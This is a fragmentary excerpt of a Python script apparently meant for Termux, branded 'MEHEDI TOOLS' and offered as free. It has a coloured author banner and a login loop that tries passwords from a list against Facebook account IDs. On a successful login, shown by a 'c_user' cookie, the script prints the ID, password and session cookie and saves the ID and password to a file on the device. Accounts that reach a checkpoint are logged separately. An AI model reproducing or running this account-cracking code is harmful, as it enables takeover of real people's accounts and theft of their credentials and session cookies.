...
AUTHOR    : MOHAMMAD MEHEDI

FACEBOOK : Md.Al Naime Sarder
...
def o():
    ...
    if None == '2':
        ...
        os.system('xdg-https://www.facebook.com/devilMEHEDI.00')
...
\033[1;37m================= \33[32;45mMEHEDI\33[0;m =====================

\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33MOHAMMAD MEHEDI

\033[1;32m     \033[1;32mFACEBOK      : \033[1;34mMd.Al Naime Sarder

\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mMEHEDI14344

\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE

\033[1;32m     \033[1;35mTEAM         :  \033[1;35mToxic-MEHEDI
...
\033[1;37m================= \33[32;45mMR\33[0;m =====================
       ...
       \33[37;41m\t WELLCOME TO MEHEDI TOOLS\33[0;m
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m(MEHEDI-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/MEHEDI-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('    \33[1;30m(MEHEDI-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/MEHEDI-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r     %s[MEHEDI] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
